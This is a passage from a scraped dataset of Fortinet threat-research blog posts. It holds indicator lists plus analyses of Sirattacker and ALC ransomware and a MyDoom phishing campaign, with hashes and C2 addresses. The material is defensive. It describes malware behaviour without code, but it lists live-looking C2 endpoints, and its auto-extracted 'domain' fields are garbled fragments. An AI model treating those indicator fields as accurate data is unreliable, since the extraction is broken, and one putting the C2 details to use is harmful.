FortiGuard Incident Response Team. su-95[.]letmaker[.]top work[.]letmaker[.]top IP Address: 163[.]123[.]142[.]210 185[.]17[.]0[.]19 79[.]137[.]203[.]156 209[.]141[.]38[.]219 45[.]142[.]122[.]11 179[.]43[.]155[.]202 d9e7d3dbb299f76bb8a84e3b72cc8e78e86ea90e2dc777cdcfd51dbd10657f47 179be54b3c2e29571fec9dcd16781eee3ce997c5352d9cce4834a10fc11d636b 20a8278b25d5c27e861dc5188f9ffd40fc45db4131245ce1020c6fa9909841d1 3422e84ca8e1ce5b106415d074667721772a7a8e9de3cd911665bad42145926c a9d0af5af4cebbcce59ad5ef823a8d0ec71147799692c03be784f9e1670467ca 84f8580343323b8534d2321c1b8789df544c4941e12d8dfa5a1fbcd201b97e72 15cc89335d137fde5c61e540cd1c77718653ed7f359b206aeb85f25e5928096a 57223450820cbe9cf5779083b7d85c440bb8b529505c55579bfcc5816bf5c80a 9e2ddef83a3043de6a1f655a556fe3eca522656ad5e6056dd92ad13fa354b32f 4d3be48fd3dde635cccd87a9925749c5a166e9b52026b5277883c7f3ab50c520 55ba36d2ee2c5359dec3a425d27df9c3fb1ddede8cef74fd0bd69d38434609fd 2ad4c954313fe912a64c4116bf7ec5cbd2e6e3a88979f7b7c2863ca21ffc9dd9 0159c3b4fdff4ba89ff9e56bf2cdcdc8aaaa35d1fa4661288225e3701f8569b5 b3ceead8490dd68c344d5b009a8bf17ed7d24499a9d66dc3493033b5696f6632 13a11140bc0c62fbc8a364f71dfdf91a3ef321bb8c9c212b3af5eb576488a95e 0767cfa1fb304ba5ef61d25ddc580cf82170b84e6a04c856e84c6ad3ad98dc92 922c114c3a7f69b3210624f3e267cfc330969d17c5813cd328557b1476ef1858 21326ecbb4cf7fef735e04f8e51efd7c861f883844e22050eab8615c7605b2f5 e6834bbc9946e79f8888d30e52ae72552c37f160a8e6ce3f56ae5a88ed190e91 d6150fd4d9616788fcb6f765ab5052669feaf90ac926ad42a59f3abf4871edb8 4e46e6ca8c993761238af82e33a98aee97e80a3c8c80d418fb410e9556788d97 a12c34fef1d6475d99aa9af2e8bf1fd55bca83982a0ee2a9131ffd9fd15cb2a7 b62ea075cfc99980488bc206cba24ffcd4faccd8b1a80aec27d9d444c430095d 283db6a012cb9183f45674cb43303fa9b6c9a7ebab41c821dc0cc122ad3bb43 Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. threat research,oracle,malware analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/old-cyber-gang-uses-new-crypter-scrubcrypt",
      "scraped_at": "2025-07-20T13:59:30.024915",
      "indicators": {
        "ip_address": [],
        "domain": [
          "erfmon",
          "SLkE",
          "iner",
          "r",
          "oengmvsg",
          "xplorer",
          "racleUpdate"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "922c114c3a7f69b3210624f3e267cfc330969d17c5813cd328557b1476ef1858",
          "55ba36d2ee2c5359dec3a425d27df9c3fb1ddede8cef74fd0bd69d38434609fd",
          "d9e7d3dbb299f76bb8a84e3b72cc8e78e86ea90e2dc777cdcfd51dbd10657f47",
          "20a8278b25d5c27e861dc5188f9ffd40fc45db4131245ce1020c6fa9909841d1",
          "0767cfa1fb304ba5ef61d25ddc580cf82170b84e6a04c856e84c6ad3ad98dc92",
          "9e2ddef83a3043de6a1f655a556fe3eca522656ad5e6056dd92ad13fa354b32f",
          "0159c3b4fdff4ba89ff9e56bf2cdcdc8aaaa35d1fa4661288225e3701f8569b5",
          "4e46e6ca8c993761238af82e33a98aee97e80a3c8c80d418fb410e9556788d97",
          "84f8580343323b8534d2321c1b8789df544c4941e12d8dfa5a1fbcd201b97e72",
          "b62ea075cfc99980488bc206cba24ffcd4faccd8b1a80aec27d9d444c430095d",
          "57223450820cbe9cf5779083b7d85c440bb8b529505c55579bfcc5816bf5c80a",
          "a9d0af5af4cebbcce59ad5ef823a8d0ec71147799692c03be784f9e1670467ca",
          "15cc89335d137fde5c61e540cd1c77718653ed7f359b206aeb85f25e5928096a",
          "b3ceead8490dd68c344d5b009a8bf17ed7d24499a9d66dc3493033b5696f6632",
          "a12c34fef1d6475d99aa9af2e8bf1fd55bca83982a0ee2a9131ffd9fd15cb2a7",
          "2ad4c954313fe912a64c4116bf7ec5cbd2e6e3a88979f7b7c2863ca21ffc9dd9",
          "4d3be48fd3dde635cccd87a9925749c5a166e9b52026b5277883c7f3ab50c520",
          "21326ecbb4cf7fef735e04f8e51efd7c861f883844e22050eab8615c7605b2f5",
          "13a11140bc0c62fbc8a364f71dfdf91a3ef321bb8c9c212b3af5eb576488a95e",
          "179be54b3c2e29571fec9dcd16781eee3ce997c5352d9cce4834a10fc11d636b",
          "3422e84ca8e1ce5b106415d074667721772a7a8e9de3cd911665bad42145926c",
          "e6834bbc9946e79f8888d30e52ae72552c37f160a8e6ce3f56ae5a88ed190e91",
          "d6150fd4d9616788fcb6f765ab5052669feaf90ac926ad42a59f3abf4871edb8"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6297229219143577
    }
  },
  {
    "id": "Fortinet_13964",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Sirattacker and ALC",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Sirattacker and ALC ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Sirattacker is one of the latest Chaos ransomware variants. It was first released in the middle of February 2023. Several versions of Chaos ransomware builders are available in Dark Web underground networks, which allow anyone to generate Chaos ransomware with custom configurations. FortiGuard Labs previously published the following blogs on Chaos ransomware: Sirattacker ransomware is likely distributed as an Ethereum mining app because all samples include an Ethereum file icon, and some are even named “ETH [3-digit number].exe”. Another Chaos ransomware variant called “Bruh,” also masquerading as a cryptocurrency generator, was reported in the previous week. While there is no apparent connection between Sirattacker and Bruh ransomware, it’s a curious coincidence. Once the Sirattacker ransomware is executed, it encrypts files on the victim’s machine and adds random four-letter file extensions to their filenames. Older Chaos ransomware variants are known to overwrite files larger than 2,117,152 bytes with random bytes, which makes file recovery impossible (unless the affected files are properly backed up). In some cases, attackers demand a ransom payment, knowing that most files are unrecoverable. Luckily, Sirattacker ransomware samples appear to be generated using a newer Chaos ransomware generator, as larger files are encrypted instead of overwritten. Once files are encrypted, Sirattacker displays a ransom note on the Command Prompt. The ransomware then replaces the desktop wallpaper with its own. The new wallpaper contains an almost identical message to the ransom note and asks victims to contact the attacker by email. Currently, theBitcoinwallet the Sirattacker ransomware actor uses has no money left in it. However, the wallet shows that in the latest transaction, recorded on February 24, 2023, the attacker sent a small amount of Bitcoin (0.00150106) to another wallet. However, as of this writing, that wallet was holding a whopping 538.57136296 Bitcoin—worth more than $12 million. Over the last few months, the attacker appears to have systematically transferred Bitcoin in and out of the wallet. For example, on February 24, 2023, $35.13 worth of Bitcoin was deposited to the attacker’s wallet. That amount of Bitcoin was transferred to another wallet on the same day. Note that screenshots were edited to highlight the attacker’s transactions. While there is no evidence that those transactions are associated with the Sirattacker ransomware, it potentially indicates that the Sirattacker ransomware threat actor has been actively involved in other illicit activities over the past few months. ALC is a recently reported ransomware. It is known for a message aimed at “Russia and its counterpart” in its ransom note. FortiGuard Labs analyzed the ransomware and found it is much more than meets the eye. Information on the infection vector used by this group is not currently available. However, it is not likely to differ significantly from other ransomware groups. Once ALC ransomware runs, it creates several files on the victim machine’s Desktop. Note that some ALC ransomware samples do not create the AlcDif.exe file shown in the image below. RUS!.txt is a ransom note containing a message with incorrect word choices, indicating that the authors are not native English speakers. For example, “Decrypted” is likely meant to be “Encrypted,” and Russsia is a misspelling of “Russia.” Per the ransom note, ALC ransomware targets “Russia and its counterparts,” which may imply China, Iran, Belarus, and others. The ransom note asks the victim to contact the attacker on Telegram, an encrypted instant messaging app popular with cybercriminals. However, no contact information or ransom price is provided in the note. Some of the ALC ransomware samples create an executable file named AlcDif.exe. It is used to create a more sophisticated ransom note. Once the ransomware executes the file, it runs in full screen in a probable attempt to scare victims by imitating a lock screen. If the victim uses multiple monitors, the program only occupies the primary monitor. The program also “toggles” Task Manager. Task Manager gets disabled when the program is run for the first time. Running it again reenables it. This is the ransom note displayed by AlcDif.exe: Unlike the ransom note in the text file, this ransom screen provides a contact address, the attacker’s crypto wallet information, a ransom price, and a unique ID assigned to the victim. However, the ransom screen lacks coherence as the provided crypto wallet does not exist, and the QR code does not work. Also, the ransom screen lists a cryptocurrency ransom of 554 Monero (over $80,000 using the exchange rate on February 27th, 2023) even though a $2,000 price tag is listed under the QR code. Most importantly, ALC ransomware does not encrypt any files, classifying it as more of a scareware. However, the ransomware sets up cryptography (it generates a random value, hashes it, creates a GO cipher object for AES, encrypts the AES key using the hard-coded RSA public key, and writes the encrypted key in an ALCKEY file), enumerates files on the compromised machine, and saves a list of those files in a separate text file for each drive found (i.e., “C.txt” contains a list of files found in C drive). That evidence leads us to two possible conclusions: either the attacker tries to cheat money out of victims knowing full well the program does not encrypt files, or the program is still in beta. Fortinet customers are already protected from these malware variants through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Sirattacker ransomware variants with the following AV signatures: FortiGuard Labs detects known ALC ransomware variants with the following AV signatures: File-based IOCs: a80908bcd96a8df6070eb9a9c83739c8d95c34d7d81b890bacda91bb05c53267 Sirattacker ransomware b3be7cf75ded8a3dec4a78a9dcf32ff433ac5fa5743d5c27b77dd67f9d6a427b Sirattacker ransomware b8a277a731485717c01a7d20fb6af795fa823a219b9b01ee2f476889610a28da Sirattacker ransomware d4d7fb3c49feed626b24e5db8735547d7b244705342dcc301faafa0b9ac72bf1 Sirattacker ransomware e6de7531d2c7900ff73b30e33170fd7530fb7771518503c65203b1a419a8d11e Sirattacker ransomware 75b45fea6000b6cb5e88b786e164c777c410e11fdcf1ff99b66b43096223d734 Sirattacker ransomware bbc6a34b48a4c71a4d9c2ae2d8c975f3b6caf2e17b86057ccbcb6686d1d5a642 ALC ransomware bff07ae5ccea66b658783fcf940eaf6baa453b534af2ebe9b70f14923871d82f ALC ransomware dc50ac15414b7274533cde5e1b28bfaa85353de38d4b21a8cb996412c0f6e432 ALC ransomware 0abe1ab9c75395a4ca829028d9c8c6530bd3bfda49e4b856b6f3539b9aa36ea5 ALC ransomware 1c5377db817c03f3c2711d351e380611291b5935ba0e2b0de763e4ef470e5bab ALC ransomware 456961cba9a8dfce1b66081c6a73c2f1ec676fcdedac24c678f890a3425e7260 ALC ransomware 48b074b48bde3f15ca28983f26e855bafd6f19e8240d938b14f31417b39d9fd2 ALC ransomware 7efa5acd25e6276d122b2e2b8055a64dc4c757fc6067d3307973327154a507ff ALC ransomware 84d4ca11c23a20bb220c15dbe3a363fb774081b6106c351fc9d8eab4f3b5b62c ALC ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). If you think this or any other cybersecurity threat has impacted you, please contact ourGlobal FortiGuard Incident Response Team. FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,FortiGuards Labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-sirattacker-acl",
      "scraped_at": "2025-07-20T13:59:37.744722",
      "indicators": {
        "ip_address": [],
        "domain": [
          "",
          "lcDif"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "dc50ac15414b7274533cde5e1b28bfaa85353de38d4b21a8cb996412c0f6e432",
          "0abe1ab9c75395a4ca829028d9c8c6530bd3bfda49e4b856b6f3539b9aa36ea5",
          "1c5377db817c03f3c2711d351e380611291b5935ba0e2b0de763e4ef470e5bab",
          "b3be7cf75ded8a3dec4a78a9dcf32ff433ac5fa5743d5c27b77dd67f9d6a427b",
          "456961cba9a8dfce1b66081c6a73c2f1ec676fcdedac24c678f890a3425e7260",
          "84d4ca11c23a20bb220c15dbe3a363fb774081b6106c351fc9d8eab4f3b5b62c",
          "75b45fea6000b6cb5e88b786e164c777c410e11fdcf1ff99b66b43096223d734",
          "bbc6a34b48a4c71a4d9c2ae2d8c975f3b6caf2e17b86057ccbcb6686d1d5a642",
          "a80908bcd96a8df6070eb9a9c83739c8d95c34d7d81b890bacda91bb05c53267",
          "7efa5acd25e6276d122b2e2b8055a64dc4c757fc6067d3307973327154a507ff",
          "bff07ae5ccea66b658783fcf940eaf6baa453b534af2ebe9b70f14923871d82f",
          "b8a277a731485717c01a7d20fb6af795fa823a219b9b01ee2f476889610a28da",
          "48b074b48bde3f15ca28983f26e855bafd6f19e8240d938b14f31417b39d9fd2",
          "e6de7531d2c7900ff73b30e33170fd7530fb7771518503c65203b1a419a8d11e",
          "d4d7fb3c49feed626b24e5db8735547d7b244705342dcc301faafa0b9ac72bf1"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.8507853403141361
    }
  },
  {
    "id": "Fortinet_33918",
    "source": "Fortinet",
    "title": "Just Because It’s Old Doesn’t Mean You Throw It Away (Including Malware!)",
    "text": "FortiGuard Labs Threat Research Art, automobiles, and wine are often associated with things that appreciate in value as they age. Malware isn’t usually thought of this way, as most threat actors strive to keep their tools as current as possible with new lures and exploitation techniques. However, every once in a while, a campaign appears that turns this paradigm on its head. FortiGuard Labs came across one such recent campaign using the MyDoom worm. MyDoom (also known as Novarg and Mimail) was first discovered back in 2004. And while it has seen some updates and modifications since its introduction, it is an anachronism in the malware world that continues to operate well beyond expectations. Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium The typical MyDoom phishing e-mail contains subjects referencing a delivery error or testing. Email headers contain a rejection reason and a custom “Content-Type”. There is also an attachment that may or may not be zipped. This attachment (unless zipped) is the MyDoom executable. FortiGuard Labs encountered the following message subjects in our recent investigation: The following attachment names were also found to be used repeatedly: The MyDoom executables attached to its phishing e-mails have an extension hidden by default by most Windows deployments (.cmd, .scr, .com, etc.). This increases the chances that users won’t identify it as malicious. Despite the extension, the file is a 32-bit Windows executable packed using the UPX (Ultimate Packer for Executables) packer (https://en.wikipedia.org/wiki/UPX) to compress and make it more difficult to analyze. With that being said, UPX has been around for quite some time. When used without modification, it is quite easy to decompress the original executable using the tool itself. The packer decompresses and executes the actual MyDoom code. Upon execution, an attempt to alter the Windows firewall settings is made. A user logged on to the system would see a request to grant access for the executable to communicate out through the Firewall. MyDoom next makes a copy of itself, places it in the “Temp” folder (C:\\Users\\<user>\\AppData\\Local\\Temp), and changes the name to a known Windows application/process. In this case, it used “lsass.exe”. It also creates a file full of garbage text that is not referenced again once created. MyDoom communicates over port 1042 to both send and receive. It rotates through a number of possible C2 domains in an attempt to locate an active one. As part of the legacy of spreading through file-sharing utilities, MyDoom also litters the “C:\\Program Files\\Common Files\\Microsoft Shared” folder with multiple versions of itself. It renames itself as some now very old and obsolete applications (e.g., Kazaa Lite) with a random name or phrase attached. Application names include: Despite its advanced age, there are still fresh infections of MyDoom occurring in the wild, along with corresponding phishing events. This goes to show that even older malware can still be dangerous no matter their age Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services: FortiGuard customers are protected against this latest MyDoom campaign, which is blocked by FortiMail. The following (AV) signature detects the malware samples mentioned in this blog W32/MyDoom. M@mm W32/Mydoom. E!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats, including theFortiPhish Phishing Simulation Service, which uses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. File-based IOCs: 9ed08@7686f6a96.com 5a6c1929f55baff2e786336c07f02c5d13194ff765073dcdfcae1b0cb53da5bc 5713a@7686f6a96.com 1b1e2421dc3d96a8b9dd58d9cc74730c966250df7c33a1e0df50d983e674b7bc atpysig.exe 6223e126a65ba888182d3369adacc7268bd78555f0426653f5b5dd963d4c31a4 attachment.doc.scr ad37758c362a38a8718837ece40ed5699e40de11ed58a586c2a6a6d8bb5251bf attachment.scr 9fc0179c7407476ced89b6124fa52f10d178f3a07e3d50c860b1ced98fb77541 attachment.doc.scr ad37758c362a38a8718837ece40ed5699e40de11ed58a586c2a6a6d8bb5251bf ATTACHMENT. SCR 1302161ca791b3fc01188582a075bbfcfeb5f28715ad527be0fe625ec452b1eb attachment.scr 9fc0179c7407476ced89b6124fa52f10d178f3a07e3d50c860b1ced98fb77541 ATTACHMENT. SCR 1302161ca791b3fc01188582a075bbfcfeb5f28715ad527be0fe625ec452b1eb document.doc 31fd079696a071a48fd4a66588adb22e36dd96028792fb416bcee0f099d6e5cb document.doc 5e99396cf134fea102470525d5105afb697b9131d891990e2dc8c9e5e34f8165 file.htm.scr 009ac15d56c3a5149f10c833b5cc191eede4d33485cab7bc3dd94675a462608c golfasian.com 9fcf4b0e00d20060274861b41b2c13b68dfedbd2ac0012436b13960b2a570d4f golfasian.com 34d9e11e71fe18f9eb290461714826e1069a129d44db25c6c4fe581f883cbc07 golfasian.com 6155f0562adfaa75cf46f674cf094d3f23c27b38c8009b6982f48ca4e77c95b1 golfasian.com 92018aff6737899f94aed2461b6e4182383b6677be2e8d4f82098265d74fb913 eba7ec36cb9cc3c3677f5325ee9f755fefe885235849aede61a0b130a9f6255b d438e3ec7bd0fa4b231a6a1704d89f117d3b6b6ba342915b4d095027d0fe4c90 john2@golfasian.com a966f61a86dae4737f99d5b7668b0fcab3124125d2030faa08855ae12c9525ee 48c70041def3bf288f7f85ee96eb59a2f7d965963a66e0c86fb3c88b3e079386 2ddc70753893167b7b5d15c1e3cf6f22b6d8a0ee8a4aaea93c40655608f6fc75 20b372391f4d0fd9e4f69fc950456b557fab27f7bbbdeede36cff404e35614aa message.bat 7b596caceaf2e8a139c01eaf67e5e52ff3247ca6d20112ea9ce59a02a1a5bb7d message.scr 2744c29d98a144fabda0ac75264235cd82b798f3bd5a56fab2ad28ec218b94c8 Message.scr eb5bfbb3be5300c1231a8ece93d239b7a02a4f308d7efe85d604f06d3aca57ad 8d4dcf463e7a69cd1b3039779d9d36c8a4669444b30d3261f876b7720bdb6752 5cb5efc8e0be0bf32eb73fbdaebedacf70cba946f5dfaea7166dcd0f4ca5989f tracy@golfasian.com c12e27b30706dd1d11e5822285e209a187724148a682d178f1e2bc3f8d670ea7 transcript.htm.pif 2ddc70753893167b7b5d15c1e3cf6f22b6d8a0ee8a4aaea93c40655608f6fc75 transcript.txt 6bbcc015c5a72b03601f8087c57024a7e74975dfb567b867c3404958e4239c9c d599d4343fe3d831bcad8ea7305f050608a182f99636ea9e87c9400d19fae043 f5dc449255319cebd38ce255060a8019e0f5697de8ac31353c7d067d9e1218e6 document.zip 11a86a2388c501773b52ae79ee1f7504caca6c25d835d40b8afc9ebe29c7a26d 942ef9da07de7d70c2efcfc20e375e6919a521d44ddabf9369042aea1553f712 message.zip 10502c24bb63af929da22ec306f44f9e557b4e3bbf588afd1a7f190aa9840938 21ee754775ca9f76b2d18d0b87722ffa0c9ab0f676e4aa6ac4881dff580087ac 505b177a6c24c69a9fda1e78db7421fad4893d7c07e3cea91897decfbc4510be message.zip ad29b1c0423a878758a444ad6bf38aa2ad276a98f0ca552b475d890db631f48b 113db96ddc72fb3300e981c7691cd202d3d0a5b097e84cd41eee6a54d868bf31 transcript.zip 3df99ae8f2083419fd030c42ca6729b6e5319df6aca1204d7081ce6ea91c69da transcript.zip 04123ec908c4a60282fa35fed76a377b22a49b6f9bfaf5a81121fd7204b4b83d 4864f84ea0f6939751310a2cca43e71a57171f37679cb7853d29a083b1617a09 35bb66f1cc9e820ef50c22d0abb0f5f7ba8724bebb4a5a795e68790943742928 9bf413a9d9b3b17767f0a93450f834947475765b2fd1ecccaa943f8ce9d58082 document.zip 9a2f837a8adb16632ce4ec3c8b02037a4e96e66e6737ef1169afb2e48e46aa6a bfaf49a691792a29024a75119a9841caacefb306494ca011a42b46c12ca65895 59ad199d81590be7b83768227fe3a79b115f6c978b8715864ae0e22e5d324e36 ecda9c446dd6aa0018cd5fc9c99ba846484f8d2a81d7f97167d89b890e4d5c1a attachment.zip e745cc1ae5a89a9f2b4b0eabbac342520703b03f68dafeb6d29194fe19e899e9 attachment.zip 1f442b9ff3c9225e3eaa9c74d16b3a74117bb66e1d372ca15b6154d386a93e57 Network-Based IOCs: 15.244.197.9:1042 Attempted C2 Connection 141.240.203.6:1042 Attempted C2 Connection 16.115.197.163:1042 Attempted C2 Connection 67.120.102.206:1042 Attempted C2 Connection 220.234.104.158:1042 Attempted C2 Connection 166.77.123.68:1042 Attempted C2 Connection 198.89.160.22:1042 Attempted C2 Connection 15.98.11.12:1042 Attempted C2 Connection 67.121.94.10:1042 Attempted C2 Connection 15.24.69.27:1042 Attempted C2 Connection 129.204.109.121:1042 Attempted C2 Connection 70.241.87.215:1042 Attempted C2 Connection 16.80.195.68:1042 Attempted C2 Connection 15.9.79.129:1042 Attempted C2 Connection 15.14.59.199:1042 Attempted C2 Connection 216.114.194.30:1042 Attempted C2 Connection 15.228.15.126:1042 Attempted C2 Connection 16.100.121.101:1042 Attempted C2 Connection 15.63.9.76:1042 Attempted C2 Connection 65.6.113.38:1042 Attempted C2 Connection 141.240.211.237:1042 Attempted C2 Connection 16.83.199.36:1042 Attempted C2 Connection 66.248.57.65:1042 Attempted C2 Connection 15.59.127.133:1042 Attempted C2 Connection 16.150.138.126:1042 Attempted C2 Connection 141.154.253.115:1042 Attempted C2 Connection 66.43.244.133:1042 Attempted C2 Connection 68.158.45.83:1042 Attempted C2 Connection 152.16.43.135:1042 Attempted C2 Connection 129.81.101.242:1042 Attempted C2 Connection 16.102.137.19:1042 Attempted C2 Connection 16.102.153.27:1042 Attempted C2 Connection 67.171.253.156:1042 Attempted C2 Connection 15.75.188.252:1042 Attempted C2 Connection 216.128.188.41:1042 Attempted C2 Connection 16.126.107.216:1042 Attempted C2 Connection 16.125.202.53:1042 Attempted C2 Connection 162.28.185.188:1042 Attempted C2 Connection 195.75.252.98:1042 Attempted C2 Connection 68.223.45.7:1042 Attempted C2 Connection 24.148.141.102:1042 Attempted C2 Connection 141.240.190.28:1042 Attempted C2 Connection 129.243.132.29:1042 Attempted C2 Connection 148.193.135.228:1042 Attempted C2 Connection 24.190.210.189:1042 Attempted C2 Connection 12.166.196.8:1042 Attempted C2 Connection 15.228.161.161:1042 Attempted C2 Connection 220.234.104.158:1042 Attempted C2 Connection email phishing,FortiGuards Labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/just-because-its-old-doesnt-mean-you-throw-it-away-including-malware",
      "scraped_at": "2025-07-20T13:59:44.830621",
      "indicators": {
        "ip_address": [
          "16.80.195.68",
          "216.128.188.41",
          "67.171.253.156",
          "16.100.121.101",
          "15.244.197.9",
          "15.228.15.126",
          "24.190.210.189",
          "16.150.138.126",
          "162.28.185.188",
          "129.204.109.121",
          "141.240.211.237",
          "16.126.107.216",
          "216.114.194.30",
          "15.59.127.133",
          "129.243.132.29",
          "15.63.9.76",
          "152.16.43.135",
          "129.81.101.242",
          "141.154.253.115",
          "220.234.104.158",
          "166.77.123.68",
          "16.83.199.36",
          "24.148.141.102",
          "16.115.197.163",
          "70.241.87.215",
          "68.158.45.83",
          "67.121.94.10",
          "16.125.202.53",
          "12.166.196.8",
          "16.102.137.19",
          "16.102.153.27",
          "141.240.203.6",
          "15.14.59.199",
          "15.24.69.27",
          "148.193.135.228",
          "68.223.45.7",
          "15.98.11.12",
          "195.75.252.98",
          "198.89.160.22",
          "65.6.113.38",
          "15.75.188.252",
          "15.9.79.129",
          "66.248.57.65",
          "67.120.102.206",
          "15.228.161.161",
          "66.43.244.133",
          "141.240.190.28"
        ],
        "domain": [
          "olfasian",
          "ttachment",
          "686f6a96",
          "ile",
          "ocument",
          "essage",
          "tpysig",
          "ranscript",
          "sass",
          "n"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "11a86a2388c501773b52ae79ee1f7504caca6c25d835d40b8afc9ebe29c7a26d",
          "1f442b9ff3c9225e3eaa9c74d16b3a74117bb66e1d372ca15b6154d386a93e57",
          "e745cc1ae5a89a9f2b4b0eabbac342520703b03f68dafeb6d29194fe19e899e9",
          "d599d4343fe3d831bcad8ea7305f050608a182f99636ea9e87c9400d19fae043",
          "5cb5efc8e0be0bf32eb73fbdaebedacf70cba946f5dfaea7166dcd0f4ca5989f",
          "eb5bfbb3be5300c1231a8ece93d239b7a02a4f308d7efe85d604f06d3aca57ad",
          "1b1e2421dc3d96a8b9dd58d9cc74730c966250df7c33a1e0df50d983e674b7bc",
          "d438e3ec7bd0fa4b231a6a1704d89f117d3b6b6ba342915b4d095027d0fe4c90",
          "3df99ae8f2083419fd030c42ca6729b6e5319df6aca1204d7081ce6ea91c69da",
          "bfaf49a691792a29024a75119a9841caacefb306494ca011a42b46c12ca65895",
          "f5dc449255319cebd38ce255060a8019e0f5697de8ac31353c7d067d9e1218e6",
          "8d4dcf463e7a69cd1b3039779d9d36c8a4669444b30d3261f876b7720bdb6752",
          "31fd079696a071a48fd4a66588adb22e36dd96028792fb416bcee0f099d6e5cb",
          "92018aff6737899f94aed2461b6e4182383b6677be2e8d4f82098265d74fb913",
          "20b372391f4d0fd9e4f69fc950456b557fab27f7bbbdeede36cff404e35614aa",
          "c12e27b30706dd1d11e5822285e209a187724148a682d178f1e2bc3f8d670ea7",
          "7b596caceaf2e8a139c01eaf67e5e52ff3247ca6d20112ea9ce59a02a1a5bb7d",
          "ad29b1c0423a878758a444ad6bf38aa2ad276a98f0ca552b475d890db631f48b",
          "5a6c1929f55baff2e786336c07f02c5d13194ff765073dcdfcae1b0cb53da5bc",
          "10502c24bb63af929da22ec306f44f9e557b4e3bbf588afd1a7f190aa9840938",
          "9bf413a9d9b3b17767f0a93450f834947475765b2fd1ecccaa943f8ce9d58082",
          "113db96ddc72fb3300e981c7691cd202d3d0a5b097e84cd41eee6a54d868bf31",
          "5e99396cf134fea102470525d5105afb697b9131d891990e2dc8c9e5e34f8165",
          "a966f61a86dae4737f99d5b7668b0fcab3124125d2030faa08855ae12c9525ee",
          "6bbcc015c5a72b03601f8087c57024a7e74975dfb567b867c3404958e4239c9c",
          "942ef9da07de7d70c2efcfc20e375e6919a521d44ddabf9369042aea1553f712",
          "2ddc70753893167b7b5d15c1e3cf6f22b6d8a0ee8a4aaea93c40655608f6fc75",
          "ecda9c446dd6aa0018cd5fc9c99ba846484f8d2a81d7f97167d89b890e4d5c1a",
          "6223e126a65ba888182d3369adacc7268bd78555f0426653f5b5dd963d4c31a4",
          "34d9e11e71fe18f9eb290461714826e1069a129d44db25c6c4fe581f883cbc07",
          "2744c29d98a144fabda0ac75264235cd82b798f3bd5a56fab2ad28ec218b94c8",
          "eba7ec36cb9cc3c3677f5325ee9f755fefe885235849aede61a0b130a9f6255b",
